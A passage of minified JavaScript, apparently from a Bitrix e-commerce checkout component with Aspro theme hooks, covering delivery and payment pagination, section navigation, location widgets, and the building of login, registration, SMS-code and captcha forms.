this.deliveryPagination.pageNumber=1,this.deliveryPagination.currentPage=this.result.DELIVERY,this.deliveryPagination.show=!1;if(this.result.PAY_SYSTEM)if(this.options.paySystemsPerPage>0&&this.result.PAY_SYSTEM.length>this.options.paySystemsPerPage){for(e=this.result.PAY_SYSTEM.slice(),t=Math.ceil(e.length/this.options.paySystemsPerPage),s=[],i=0;i<t;i++)s.push(e.splice(0,this.options.paySystemsPerPage));for(this.paySystemPagination.pages=s,i=0;i<this.result.PAY_SYSTEM.length;i++)if("Y"==this.result.PAY_SYSTEM[i].CHECKED){this.paySystemPagination.pageNumber=Math.ceil(++i/this.options.paySystemsPerPage);break}this.paySystemPagination.pageNumber=this.paySystemPagination.pageNumber||1,this.paySystemPagination.currentPage=s.slice(this.paySystemPagination.pageNumber-1,this.paySystemPagination.pageNumber)[0],this.paySystemPagination.show=!0}else this.paySystemPagination.pageNumber=1,this.paySystemPagination.currentPage=this.result.PAY_SYSTEM,this.paySystemPagination.show=!1},initPickUpPagination:function(){var e,t,s,i,o=!1,a=!1,r=0;if(this.options.pickUpsPerPage>=0&&this.result.DELIVERY)for(r=0;r<this.result.DELIVERY.length;r++)if("Y"===this.result.DELIVERY[r].CHECKED&&this.result.DELIVERY[r].STORE_MAIN){a=this.result.DELIVERY[r].STORE_MAIN.length>0,o=this.result.DELIVERY[r].STORE_MAIN.length>this.options.pickUpsPerPage,a&&(e=this.getPickUpInfoArray(this.result.DELIVERY[r].STORE_MAIN));break}if(a)if(this.options.pickUpsPerPage>0&&o){for(t=e.slice(),s=Math.ceil(t.length/this.options.pickUpsPerPage),i=[],r=0;r<s;r++)i.push(t.splice(0,this.options.pickUpsPerPage));for(this.pickUpPagination.pages=i,r=0;r<e.length;r++)if(!this.result.BUYER_STORE||e[r].ID==this.result.BUYER_STORE){this.pickUpPagination.pageNumber=Math.ceil(++r/this.options.pickUpsPerPage);break}this.pickUpPagination.pageNumber||(this.pickUpPagination.pageNumber=1),this.pickUpPagination.currentPage=i.slice(this.pickUpPagination.pageNumber-1,this.pickUpPagination.pageNumber)[0],this.pickUpPagination.show=!0}else this.pickUpPagination.pageNumber=1,this.pickUpPagination.currentPage=e,this.pickUpPagination.show=!1},prepareLocations:function(e){var t,s,i,o;if(this.locations={},this.cleanLocations={},BX.util.object_keys(e).length)for(s in e)if(e.hasOwnProperty(s)){for(i in this.locationsTemplate=e[s].template||"",t=[],(o=e[s].output).clean&&(this.cleanLocations[s]=BX.processHTML(o.clean,!1),delete o.clean),o)o.hasOwnProperty(i)&&t.push({output:BX.processHTML(o[i],!1),showAlt:e[s].showAlt,lastValue:e[s].lastValue,coordinates:e[s].coordinates||!1});this.locations[s]=t}},locationsCompletion:function(){var e,t,s,i,o,a,r,l;for(e in this.locationsInitialized=!0,this.fixLocationsStyle(this.deliveryBlockId,this.regionHiddenBlockNode),this.fixLocationsStyle(this.propsBlockNode,this.propsHiddenBlockNode),this.locations){if(!this.locations.hasOwnProperty(e))continue;if(!(t=this.orderBlockNode.querySelector('div[data-property-id-row="'+e+'"]')))continue;let n;s=t.querySelector("div.bx-ui-sls-clear"),i=t.querySelector("div.bx-ui-slst-pool"),o=t.querySelector("input.bx-ui-sls-fake[type=text]"),t.removeAttribute("style"),this.bindValidation(e,t),s&&BX.bind(s,"click",(function(e){var t,s=e.target||e.srcElement,i=BX.findParent(s,{tagName:"DIV",className:"form-group"});i&&(t=i.querySelector("input.bx-ui-sls-fake[type=text]")),t&&BX.fireEvent(t,"keyup")})),!this.firstLoad&&this.options.propertyValidation&&(i&&(a=this.validation.properties[e],r=this.getValidationData(a,t),(l=BX.findParent(t,{className:"bx-soa-section"}))&&"true"==l.getAttribute("data-visited")&&this.isValidProperty(r)),o&&BX.fireEvent(o,"keyup")),o?n=o.value:t.querySelectorAll(".bx-ui-slst-input-block").forEach((function(e){n=e.querySelector(".bx-combobox-fake-as-input").textContent})),this.deliveryBlockNode.querySelectorAll(".destination_value").forEach((function(e){e.textContent=n}))}this.firstLoad&&this.result.IS_AUTHORIZED&&void 0===this.result.LAST_ORDER_DATA.FAIL?this.showActualBlock():this.result.SHOW_AUTH||this.changeVisibleContent(),this.checkNotifications(),this.activeSectionId!=this.propsBlockNode.id&&this.editFadePropsContent(this.propsBlockNode.querySelector(".bx-soa-section-content"))},fixLocationsStyle:function(e,t){if(e&&t){var s,i,o,a=this.activeSectionId==e.id?e:t;if(s=a.querySelectorAll("div.bx-sls div.dropdown-block.bx-ui-sls-input-block"),i=a.querySelectorAll("div.bx-slst div.dropdown-block.bx-ui-slst-input-block"),s.length)for(o=0;o<s.length;o++)BX.addClass(s[o],"form-control");if(i.length)for(o=0;o<i.length;o++)BX.addClass(i[o],"form-control")}},clickOrderSaveAction:function(e){return this.isValidForm()&&(this.allowOrderSave(),appAspro.userConsent&&appAspro.userConsent.useBitrix&&BX.UserConsent&&BX.onCustomEvent("bx-soa-order-save-aspro",[]),this.doSaveAction()),BX.PreventDefault(e)},doSaveAction:function(){this.isOrderSaveAllowed()&&(this.reachGoal("order"),this.sendRequest("saveOrderAjax"))},clickNextAction:function(e){var t,s=e.target||e.srcElement,i=BX.findParent(s,{className:"bx-active"}),o=this.getNextSection(i);if("bx-soa-delivery"===i.id){if(this.isValidRegionBlock().length)return;i.querySelector(".alert.alert-danger").style.display="none",BX.cleanNode(i.querySelector(".alert.alert-danger")),BX.removeClass(i,"bx-step-error")}return this.reachGoal("next",i),this.result.IS_AUTHORIZED&&void 0===this.result.LAST_ORDER_DATA.FAIL||"false"!=o.next.getAttribute("data-visited")||(t=this.orderBlockNode.querySelectorAll(".bx-soa-section.bx-active"),o.next.id==t[t.length-1].id&&this.switchOrderSaveButtons(!0)),this.fade(i,i),this.show(i),o.prev&&o.next.querySelector(".change-info").click(),BX.PreventDefault(e)},clickPrevAction:function(e){var t=e.target||e.srcElement,s=BX.findParent(t,{className:"bx-active"}),i=this.getPrevSection(s);return this.fade(s),this.show(i.next),this.animateScrollTo(i.next,800),BX.PreventDefault(e)},showAuthBlock:function(){var e=this.authBlockNode,t=BX(this.activeSectionId);e&&!BX.hasClass(e,"bx-selected")&&(t&&"bx-soa-auth"!==this.activeSectionId&&this.fade(t),this.show(e))},closeAuthBlock:function(){var e=this.authBlockNode,t=this.getNextSection(e).next;this.fade(e),BX.cleanNode(BX(t.id+"-hidden")),this.show(t)},shouldSkipSection:function(e){var t=!1;if("Y"===this.params.SKIP_USELESS_BLOCK){if(e.id===this.pickUpBlockNode.id){var s=this.getSelectedDelivery();s&&(t=1===this.getPickUpInfoArray(s.STORE).length)}e.id===this.deliveryBlockNode.id&&(t=this.result.DELIVERY&&1===this.result.DELIVERY.length&&0===this.result.DELIVERY[0].EXTRA_SERVICES.length&&!this.result.DELIVERY[0].CALCULATE_ERRORS),e.id===this.paySystemBlockNode.id&&(t=this.result.PAY_SYSTEM&&1===this.result.PAY_SYSTEM.length&&"Y"!==this.result.PAY_FROM_ACCOUNT)}return t},getNextSection:function(e,t){if(!this.orderBlockNode||!e)return{};var s,i,o=this.orderBlockNode.querySelectorAll(".bx-soa-section.bx-active");for(i=0;i<o.length;i++)if(o[i].id===e.id&&o[i+1])return s=o[i+1],this.shouldSkipSection(s)?(this.markSectionAsCompleted(s),this.getNextSection(s,s)):{prev:e,next:s,skip:t};return{next:e}},markSectionAsCompleted:function(e){this.result.IS_AUTHORIZED&&void 0===this.result.LAST_ORDER_DATA.FAIL||"false"!==e.getAttribute("data-visited")||this.changeVisibleSection(e,!0),e.setAttribute("data-visited","true"),BX.addClass(e,"bx-step-completed"),BX.remove(e.querySelector(".alert.alert-warning.alert-hide")),this.checkBlockErrors(e)},getPrevSection:function(e){if(!this.orderBlockNode||!e)return{};var t,s,i=this.orderBlockNode.querySelectorAll(".bx-soa-section.bx-active");for(s=0;s<i.length;s++)if(i[s].id===e.id&&i[s-1])return t=i[s-1],this.shouldSkipSection(t)?(this.markSectionAsCompleted(t),this.getPrevSection(t)):{prev:e,next:t};return{next:e}},addAnimationEffect:function(e,t,s){e&&t&&(this.timeOut[e.id]&&(clearTimeout(this.timeOut[e.id].timer),BX.removeClass(e,this.timeOut[e.id].className)),setTimeout((function(){BX.addClass(e,t)}),10),this.timeOut[e.id]={className:t,timer:setTimeout(BX.delegate((function(){BX.removeClass(e,t),delete this.timeOut[e.id]}),this),s||5e3)})},fade:function(e,t){if(e&&e.id){this.hasErrorSection[e.id]=!1;var s,i=e.offsetHeight;switch(e.id){case this.authBlockNode.id:this.authBlockNode.style.display="none",BX.removeClass(this.authBlockNode,"bx-active");break;case this.basketBlockNode.id:this.editFadeBasketBlock();break;case this.regionBlockNode.id:this.editFadeRegionBlock();break;case this.paySystemBlockNode.id:BX.remove(this.paySystemBlockNode.querySelector(".alert.alert-warning.alert-hide")),this.editFadePaySystemBlock();break;case this.deliveryBlockNode.id:BX.remove(this.deliveryBlockNode.querySelector(".alert.alert-warning.alert-hide")),this.editFadeDeliveryBlock();break;case this.pickUpBlockNode.id:this.editFadePickUpBlock();break;case this.propsBlockNode.id:this.editFadePropsBlock();break}if(BX.addClass(e,"bx-step-completed"),BX.removeClass(e,"bx-selected"),s=e.offsetHeight,e.style.height=i+"px",t){var o,a=BX.GetWindowScrollPos().scrollTop;BX.pos(this.orderBlockNode);o=BX.pos(e).top-80}new BX.easing({duration:t?400:600,start:{height:i,scrollTop:a},finish:{height:s,scrollTop:o},transition:BX.easing.makeEaseOut(BX.easing.transitions.quad),step:function(s){e.style.height=s.height+"px",t&&window.scrollTo(0,s.scrollTop)},complete:function(){e.style.height=""}}).animate(),this.checkBlockErrors(e)}},show:function(e){if(e&&e.id){switch(this.activeSectionId=e.id,BX.removeClass(e,"bx-step-error bx-step-warning"),e.id){case this.authBlockNode.id:this.authBlockNode.style.display="",BX.addClass(this.authBlockNode,"bx-active");break;case this.basketBlockNode.id:this.editActiveBasketBlock(!0),this.alignBasketColumns();break;case this.regionBlockNode.id:this.editActiveRegionBlock(!0);break;case this.deliveryBlockNode.id:this.editActiveDeliveryBlock(!1);break;case this.paySystemBlockNode.id:this.editActivePaySystemBlock(!0);break;case this.pickUpBlockNode.id:this.editActivePickUpBlock(!0);break;case this.propsBlockNode.id:this.editActivePropsBlock(!0);break}"false"===e.getAttribute("data-visited")&&(this.showBlockErrors(e),this.notifyAboutWarnings(e)),e.setAttribute("data-visited","true")}},showByClick:function(e){var t=e.target||e.srcElement,s=BX.findParent(t,{className:"bx-active"}),i=BX.GetWindowScrollPos().scrollTop;return!s||BX.hasClass(s,"bx-selected")||(this.reachGoal("edit",s),this.show(s),setTimeout(BX.delegate((function(){BX.pos(s).top<i&&this.animateScrollTo(s,300)}),this),320)),BX.PreventDefault(e)},showActualBlock:function(){for(var e=this.orderBlockNode.querySelectorAll(".bx-soa-section.bx-active"),t=0;e[t];){if(e[t].id===this.regionBlockNode.id&&this.isValidRegionBlock(),!this.checkBlockErrors(e[t])||!this.checkPreload(e[t])){this.activeSectionId!==e[t].id&&(BX(this.activeSectionId)&&this.fade(BX(this.activeSectionId)),this.show(e[t]));break}e[t].setAttribute("data-visited","true"),t++}},getBlockFooter:function(e){var t=this.orderBlockNode.querySelectorAll(".bx-soa-section.bx-active"),s=t[0],i=t[t.length-1],o=BX.findParent(e,{className:"bx-soa-section"});o.id&&(o&&o.id.indexOf(s.id),o&&"-1"!=o.id.indexOf(i.id)&&!0,e.appendChild(BX.create("DIV",{props:{className:"bx-soa-more"},children:[BX.create("DIV",{props:{className:"bx-soa-more-btn btn btn-default"},html:BX.message("TITLE_SOA_SAVE_INFO_SECTION"),events:{click:BX.proxy(this.clickNextAction,this)}})]})))},getNewContainer:function(e){return BX.create("DIV",{props:{className:"bx-soa-section-content"+(e?"":" container-fluid")}})},switchOrderSaveButtons:function(e){return;var t=this.orderSaveBlockNode,s=this.totalBlockNode.querySelector(".bx-soa-cart-total-button-container"),i=this.mobileTotalBlockNode.querySelector(".bx-soa-cart-total-button-container");""==this.orderSaveBlockNode.style.display!=e&&e&&(t.style.opacity=0,t.style.display="",s&&(s.style.opacity=0,s.style.display=""),i&&(i.style.opacity=0,i.style.display=""),new BX.easing({duration:500,start:{opacity:0},finish:{opacity:100},transition:BX.easing.transitions.linear,step:function(e){t.style.opacity=e.opacity/100,s&&(s.style.opacity=e.opacity/100),i&&(i.style.opacity=e.opacity/100)},complete:function(){t.removeAttribute("style"),s&&s.removeAttribute("style"),i&&i.removeAttribute("style")}}).animate())},shouldBeSectionVisible:function(e,t){var s,i=!1;if(!e||!e.length)return i;for(;t<e.length;t++){if("true"==e[t].getAttribute("data-visited")){i=!0;break}if(!this.firstLoad&&(s=e[t].querySelector(".bx-soa-editstep"))&&"none"!==s.style.display){i=!0;break}}return i},changeVisibleContent:function(){var e,t,s=this.orderBlockNode.querySelectorAll(".bx-soa-section.bx-active"),i=!!this.result.IS_AUTHORIZED&&"Y"===this.params.USE_PRELOAD&&!0!==this.result.LAST_ORDER_DATA.FAIL,o=!0;for(e=0;e<s.length;e++)t=(t=this.firstLoad&&i)||this.shouldBeSectionVisible(s,e),this.changeVisibleSection(s[e],t),this.firstLoad&&o&&(t&&s[e+1]&&this.checkBlockErrors(s[e])&&(i&&this.checkPreload(s[e])||!i&&this.shouldSkipSection(s[e]))?(this.fade(s[e]),this.markSectionAsCompleted(s[e]),this.show(s[e+1])):o=!1);this.result.IS_AUTHORIZED&&void 0===this.result.LAST_ORDER_DATA.FAIL||"final_step"!==this.params.SHOW_ORDER_BUTTON||this.switchOrderSaveButtons(this.shouldBeSectionVisible(s,s.length-1))},changeVisibleSection:function(e,t){var s;e.id!==this.basketBlockNode.id&&(s=e.querySelector(".bx-soa-section-content"))&&(s.style.display=t?"":"none")},editOrder:function(){if(!this.orderBlockNode||!this.result)return;if(BX.addClass(this.deliveryBlockNode,"bx-active"),!BX.util.object_keys(this.locations).length){const e=this.deliveryBlockNode.querySelectorAll(".city_destination, .change_city");e&&e.forEach((e=>{e.style.display="none"}))}const e=this.deliveryBlockNode.querySelector(".bx-soa-section-content");this.result.DELIVERY.length>0?e.removeAttribute("style"):e.style.display="none",this.mobileTotalBlockNode.style.display=this.result.SHOW_AUTH?"none":"";const t=this.orderBlockNode.querySelectorAll(".bx-soa-section.bx-active");for(let e in t)t.hasOwnProperty(e)&&this.editSection(t[e]);this.editTotalBlock(),this.initAction(),this.showErrors(this.result.ERROR,!1),this.showWarnings()},editSection:function(e){if(e&&e.id){this.result.SHOW_AUTH&&e.id!=this.authBlockNode.id&&e.id!=this.basketBlockNode.id?e.style.display="none":e.id!=this.pickUpBlockNode.id&&(e.style.display="");var t,s,i=e.id!=this.basketBlockNode.id||e.id==this.activeSectionId,o=e.querySelector(".bx-soa-section-title-container");switch(e.id==this.basketBlockNode.id&&(t=o.querySelector(".bx-soa-editstep"),BX.unbindAll(o),BX.unbindAll(t),this.result.SHOW_AUTH?t&&BX.bind(t,"click",BX.delegate((function(){this.animateScrollTo(this.authBlockNode),this.addAnimationEffect(this.authBlockNode,"bx-step-good")}),this)):t&&BX.bind(t,"click",BX.proxy(this.showByClick,this))),s=e.querySelector(".alert.alert-danger"),this.hasErrorSection[e.id]=s&&"none"!=s.style.display,e.id){case this.authBlockNode.id:this.editAuthBlock();break;case this.basketBlockNode.id:this.editBasketBlock(i);break;case this.regionBlockNode.id:this.editRegionBlock(i);break;case this.paySystemBlockNode.id:this.editPaySystemBlock(i);break;case this.deliveryBlockNode.id:this.editDeliveryBlock(i);break;case this.pickUpBlockNode.id:this.editPickUpBlock(i);break;case this.propsBlockNode.id:this.editPropsBlock(i);break}i&&e.setAttribute("data-visited","true")}},editAuthBlock:function(){if(this.authBlockNode){var e,t,s=this.authBlockNode.querySelector(".bx-soa-section-content");BX.hasClass(s,"reg")?(e=s,s=BX.firstChild(this.authHiddenBlockNode)):e=BX.firstChild(this.authHiddenBlockNode),BX.cleanNode(s),BX.cleanNode(e),this.result.SHOW_AUTH?(this.getErrorContainer(s),this.editAuthorizeForm(s),this.editSocialContent(s),this.getAuthReference(s),this.getErrorContainer(e),this.editRegistrationForm(e),this.getAuthReference(e)):(BX.onCustomEvent("OnBasketChange"),this.closeAuthBlock()),this.result.OK_MESSAGE&&this.result.OK_MESSAGE.length&&(this.toggleAuthForm({target:this.authBlockNode.querySelector("input[type=submit]")}),t=BX.create("DIV",{props:{className:"alert alert-success"},text:this.result.OK_MESSAGE.join()}),this.result.OK_MESSAGE="",BX.prepend(t,this.authBlockNode.querySelector(".bx-soa-section-content")))}},editAuthorizeForm:function(e){var t,s,i,o,a;t=this.createAuthFormInputContainer(BX.message("STOF_LOGIN"),BX.create("INPUT",{attrs:{"data-next":"USER_PASSWORD"},props:{name:"USER_LOGIN",type:"text",value:this.result.AUTH.USER_LOGIN,maxlength:"30"},events:{keypress:BX.proxy(this.checkKeyPress,this)}})),s=this.createAuthFormInputContainer(BX.message("STOF_PASSWORD"),BX.create("INPUT",{attrs:{"data-send":!0},props:{name:"USER_PASSWORD",type:"password",value:"",maxlength:"30"},events:{keypress:BX.proxy(this.checkKeyPress,this)}})),i=BX.create("DIV",{props:{className:"bx-authform-formgroup-container"},children:[BX.create("DIV",{props:{className:"checkbox onoff"},children:[BX.create("LABEL",{props:{className:"bx-filter-param-label"},children:[BX.create("INPUT",{props:{type:"checkbox",name:"USER_REMEMBER",value:"Y"}}),BX.create("SPAN",{props:{className:"bx-filter-param-text"},text:BX.message("STOF_REMEMBER")})]})]})]}),o=BX.create("DIV",{props:{className:"bx-authform-formgroup-container"},children:[BX.create("INPUT",{props:{id:"do_authorize",type:"hidden",name:"do_authorize",value:"N"}}),BX.create("button",{text:BX.message("STOF_ENTER"),props:{type:"submit",className:"btn btn-lg btn-default"},events:{click:BX.delegate((function(e){return BX("do_authorize").value="Y",this.sendRequest("showAuthForm"),BX.PreventDefault(e)}),this)}})]}),a=BX.create("DIV",{props:{className:"bx-authform"},children:[BX.create("H3",{props:{className:"bx-title"},text:BX.message("STOF_AUTH_REQUEST")}),t,s,i,o,BX.create("A",{props:{href:this.params.PATH_TO_AUTH+"?forgot_password=yes&back_url="+encodeURIComponent(document.location.href)},text:BX.message("STOF_FORGET_PASSWORD")})]}),e.appendChild(BX.create("DIV",{props:{className:"col-md-6"},children:[a]}))},createAuthFormInputContainer:function(e,t,s){var i="";return s&&(i+='<span class="bx-authform-starrequired">*</span>'),i=e+i,BX.create("DIV",{props:{className:"bx-authform-formgroup-container"},children:[BX.create("DIV",{props:{className:"bx-authform-label-container"},html:i}),BX.create("DIV",{props:{className:"bx-authform-input-container"},children:[t]})]})},activatePhoneAuth:function(){this.result.SMS_AUTH&&new BX.PhoneAuth({containerId:"bx_register_resend",errorContainerId:"bx_register_error",interval:60,data:{signedData:this.result.SMS_AUTH.SIGNED_DATA},onError:function(e){var t=BX("bx_register_error"),s=BX.findChildByClassName(t,"errortext");s.innerHTML="";for(var i=0;i<e.errors.length;i++)s.innerHTML=s.innerHTML+BX.util.htmlspecialchars(e.errors[i].message)+"<br>";t.style.display=""}})},editRegistrationForm:function(e){if(this.result.AUTH){var t=[],s=this.result.SMS_AUTH&&"OK"===this.result.SMS_AUTH.TYPE;if(s)t.push(BX.create("DIV",{props:{className:"alert alert-success"},text:BX.message("STOF_REG_SMS_REQUEST")})),t.push(BX.create("INPUT",{props:{type:"hidden",name:"SIGNED_DATA",value:this.result.SMS_AUTH.SIGNED_DATA||""}})),t.push(this.createAuthFormInputContainer(BX.message("STOF_SMS_CODE"),BX.create("INPUT",{attrs:{"data-send":!0},props:{name:"SMS_CODE",type:"text",size:40},events:{keypress:BX.proxy(this.checkKeyPress,this)}}),!0)),t.push(BX.create("DIV",{props:{className:"bx-authform-formgroup-container"},children:[BX.create("INPUT",{props:{name:"code_submit_button",type:"submit",className:"btn btn-lg btn-default",value:BX.message("STOF_SEND")},events:{click:BX.delegate((function(e){return this.sendRequest("confirmSmsCode"),BX.PreventDefault(e)}),this)}})]})),t.push(BX.create("DIV",{props:{className:"bx-authform-formgroup-container"},children:[BX.create("DIV",{props:{id:"bx_register_error"},style:{display:"none"}}),BX.create("DIV",{props:{id:"bx_register_resend"}})]}));else{if(t.push(BX.create("H3",{props:{className:"bx-title"},text:BX.message("STOF_REG_REQUEST")})),t.push(this.createAuthFormInputContainer(BX.message("STOF_NAME"),BX.create("INPUT",{attrs:{"data-next":"NEW_LAST_NAME"},props:{name:"NEW_NAME",type:"text",size:40,value:this.result.AUTH.NEW_NAME||""},events:{keypress:BX.proxy(this.checkKeyPress,this)}}),!0)),t.push(this.createAuthFormInputContainer(BX.message("STOF_LASTNAME"),BX.create("INPUT",{attrs:{"data-next":"NEW_EMAIL"},props:{name:"NEW_LAST_NAME",type:"text",size:40,value:this.result.AUTH.NEW_LAST_NAME||""},events:{keypress:BX.proxy(this.checkKeyPress,this)}}),!0)),t.push(this.createAuthFormInputContainer(BX.message("STOF_EMAIL"),BX.create("INPUT",{attrs:{"data-next":"PHONE_NUMBER"},props:{name:"NEW_EMAIL",type:"text",size:40,value:this.result.AUTH.NEW_EMAIL||""},events:{keypress:BX.proxy(this.checkKeyPress,this)}}),"Y"==this.result.AUTH.new_user_email_required)),"Y"===this.result.AUTH.new_user_phone_auth){const e=this.createAuthFormInputContainer(BX.message("STOF_PHONE"),BX.create("INPUT",{attrs:{"data-next":"captcha_word",autocomplete:"tel"},props:{name:"PHONE_NUMBER",type:"text",size:40,value:this.result.AUTH.PHONE_NUMBER||"",className:"phone"},events:{keypress:BX.proxy(this.checkKeyPress,this)}}),"Y"===this.result.AUTH.new_user_phone_required);t.push(e)}if(this.authGenerateUser&&(t.push(BX.create("LABEL",{props:{for:"NEW_GENERATE_N"},children:[BX.create("INPUT",{attrs:{checked:!this.authGenerateUser},props:{id:"NEW_GENERATE_N",type:"radio",name:"NEW_GENERATE",value:"N"}}),BX.message("STOF_MY_PASSWORD")],events:{change:BX.delegate((function(){this.authBlockNode.querySelector(".generated").style.display="",this.authGenerateUser=!1}),this)}})),t.push(BX.create("BR")),t.push(BX.create("LABEL",{props:{for:"NEW_GENERATE_Y"},children:[BX.create("INPUT",{attrs:{checked:this.authGenerateUser},props:{id:"NEW_GENERATE_Y",type:"radio",name:"NEW_GENERATE",value:"Y"}}),BX.message("STOF_SYS_PASSWORD")],events:{change:BX.delegate((function(){this.authBlockNode.querySelector(".generated").style.display="none",this.authGenerateUser=!0}),this)}}))),t.push(BX.create("DIV",{props:{className:"generated"},style:{display:this.authGenerateUser?"none":""},children:[this.createAuthFormInputContainer(BX.message("STOF_LOGIN"),BX.create("INPUT",{props:{name:"NEW_LOGIN",type:"text",size:30,value:this.result.AUTH.NEW_LOGIN||""},events:{keypress:BX.proxy(this.checkKeyPress,this)}}),!0),this.createAuthFormInputContainer(BX.message("STOF_PASSWORD"),BX.create("INPUT",{props:{name:"NEW_PASSWORD",type:"password",size:30},events:{keypress:BX.proxy(this.checkKeyPress,this)}}),!0),this.createAuthFormInputContainer(BX.message("STOF_RE_PASSWORD"),BX.create("INPUT",{props:{name:"NEW_PASSWORD_CONFIRM",type:"password",size:30},events:{keypress:BX.proxy(this.checkKeyPress,this)}}),!0)]})),"Y"==this.result.AUTH.captcha_registration&&t.push(BX.create("DIV",{props:{className:"bx-authform-formgroup-container"},children:[BX.create("DIV",{props:{className:"bx-authform-label-container"},children:[BX.create("SPAN",{props:{className:"bx-authform-starrequired"},text:"*"}),BX.message("CAPTCHA_REGF_PROMT"),BX.create("DIV",{props:{className:"bx-captcha"},children:[BX.create("INPUT",{props:{name:"captcha_sid",type:"hidden",value:this.result.AUTH.capCode||""}}),BX.create("IMG",{props:{src:"/bitrix/tools/captcha.php?captcha_sid="+this.result.AUTH.capCode,alt:""}}),BX.create("button",{props:{className:"refresh btn--no-btn-appearance font_13 link-opacity-color link-opacity-color--hover dotted no-decoration-hover"},text:BX.message("REFRESH_CAPTCHA")})]})]}),BX.create("DIV",{props:{className:"captcha_input"},children:[BX.create("INPUT",{attrs:{"data-send":!0,className:"inputtext form-control"},props:{name:"captcha_word",type:"text",size:"30",maxlength:"50",value:""},events:{keypress:BX.proxy(this.checkKeyPress,this)}})]})]})),"Y"===arAsproOptions?.THEME?.SHOW_LICENCE&&"object"==typeof appAspro&&appAspro?.userConsent?.licenseRegisterBlock){const e=BX.create("div",{props:{className:"bx-authform-formgroup-container"},children:[appAspro.userConsent.licenseRegisterBlock]}),s=e.querySelector(".main-user-consent-request-announce-link");s&&(s.innerText=s.innerText.replace(BX.message("ORDER_DEFAULT_BUTTON_CONSENT"),BX.message("STOF_REGISTER"))),t.push(e)}t.push(BX.create("DIV",{props:{className:"bx-authform-formgroup-container"},children:[BX.create("INPUT",{props:{id:"do_register",name:"do_register",type:"hidden",value:"N"}}),BX.create("INPUT",{props:{type:"submit",className:"btn btn-lg btn-default",value:BX.message("STOF_REGISTER")},events:{click:BX.delegate((function(e){var t=BX.findChild(BX("bx-soa-auth"),{attribute:{name:"NEW_EMAIL"}},!0,!1),s=BX.findChild(BX("bx-soa-auth"),{attribute:{name:"NEW_LOGIN"}},!0,!1);return"Y"===arAsproOptions.THEME.LOGIN_EQUAL_EMAIL&&s&&t&&(s.value=t.value),BX("do_register").value="Y",this.sendRequest("showAuthForm"),BX.PreventDefault(e)}),this)}}),BX.create("A",{props:{className:"btn btn-lg btn-link",href:""},text:BX.message("STOF_DO_AUTHORIZE"),events:{click:BX.delegate((function(e){return this.toggleAuthForm(e),BX.PreventDefault(e)}),this)}})]}))}e.appendChild(BX.create("DIV",{props:{className:"col-md-12"},children:[BX.create("DIV",{props:{className:"bx-authform"},children:t})]})),s&&this.activatePhoneAuth()}},editSocialContent:function(e){if(BX("bx-soa-soc-auth-services")){var t=[];if(!1===this.socServiceHiddenNode){var s=BX("bx-soa-soc-auth-services").querySelector(".bx-authform-social");BX.type.isDomNode(s)&&(this.socServiceHiddenNode=s.innerHTML,BX.remove(s))}this.socServiceHiddenNode&&(t.push(BX.create("DIV",{props:{className:"bx-authform-social"},html:'<h3 class="bx-title">'+BX.message("SOA_DO_SOC_SERV")+"</h3>"+this.socServiceHiddenNode})),t.push(BX.create("hr",{props:{className:"bxe-light"}}))),"Y"===this.result.AUTH.new_user_registration&&t.push(BX.create("DIV",{props:{className:"bx-soa-reg-block"},children:[BX.create("P",{html:this.params.MESS_REGISTRATION_REFERENCE}),BX.create("A",{props:{className:"btn btn-default btn-lg"},text:BX.message("STOF_DO_REGISTER"),events:{click:BX.delegate((function(e){return this.toggleAuthForm(e),BX.PreventDefault(e)}),this)}})]})),e.appendChild(BX.create("DIV",{props:{className:"col-md-6"},children:t}))}},getAuthReference:function(e){e.appendChild(BX.create("DIV",{props:{className:"row"},children:[BX.create("DIV",{props:{className:"bx-soa-reference col-xs-12"},children:[this.params.MESS_AUTH_REFERENCE_1,BX.create("BR"),this.params.MESS_AUTH_REFERENCE_2,BX.create("BR"),this.params.MESS_AUTH_REFERENCE_3]})]}))},toggleAuthForm:function(e){if(e){var t=e.target||e.srcElement,s=BX.findParent(t,{className:"bx-soa-section"}),i=BX.findParent(t,{className:"bx-soa-section-content"}),o=BX.firstChild(this.authHiddenBlockNode);new BX.easing({duration:100,start:{opacity:100},finish:{opacity:0},transition:BX.easing.makeEaseOut(BX.easing.transitions.quad),step:function(e){i.style.opacity=e.opacity/100}}).animate(),this.authHiddenBlockNode.appendChild(i),BX.cleanNode(s),s.appendChild(BX.create("DIV",{props:{className:"bx-soa-section-title-container"},children:[BX.create("h2",{props:{className:"bx-soa-section-title col-xs-7 col-sm-9"},html:BX.hasClass(o,"reg")?this.params.MESS_REG_BLOCK_NAME:this.params.MESS_AUTH_BLOCK_NAME})]})),o.style.opacity=0,s.appendChild(o),setTimeout((function(){new BX.easing({duration:100,start:{opacity:0},finish:{opacity:100},transition:BX.easing.makeEaseOut(BX.easing.transitions.quart),step:function(e){o.style.opacity=e.opacity/100},complete:function(){if(o.style.height="",o.style.opacity="",BX.Aspro?.Captcha){let e=o.querySelector(BX.Aspro.Captcha.selector);e&&(e.style.height="")}}}).animate()}),110),this.animateScrollTo(s)}},alignBasketColumns:function(){return;if(this.basketBlockNode){var e,t,s,i,o=0,a=0,r=BX.GetWindowInnerSize();if(r.innerWidth>580&&r.innerWidth<992){if(i=100,(s=this.basketBlockNode.querySelectorAll(".bx-soa-basket-info")).length){if((t=s[0].querySelectorAll(".bx-soa-item-properties")).length&&""!=t[0].style.width)return;if((a=t.length)>0)for(a=a>4?4:a,i=parseInt(i/a);o<s.length;o++)for(t=s[o].querySelectorAll(".bx-soa-item-properties"),e=0;e<t.length;e++)t[e].style.width=i+"%"}}else{if((t=this.basketBlockNode.querySelectorAll(".bx-soa-item-properties")).length&&""==t[0].style.width)return;for(;o<t.length;o++)t[o].style.width=""}}},editBasketBlock:function(e){this.basketBlockNode&&this.basketHiddenBlockNode&&this.result.GRID&&(BX.remove(BX.lastChild(this.basketBlockNode)),BX.remove(BX.lastChild(this.basketHiddenBlockNode)),this.editActiveBasketBlock(e),this.editFadeBasketBlock(e),this.initialized.basket=!0)},editActiveBasketBlock:function(e){var 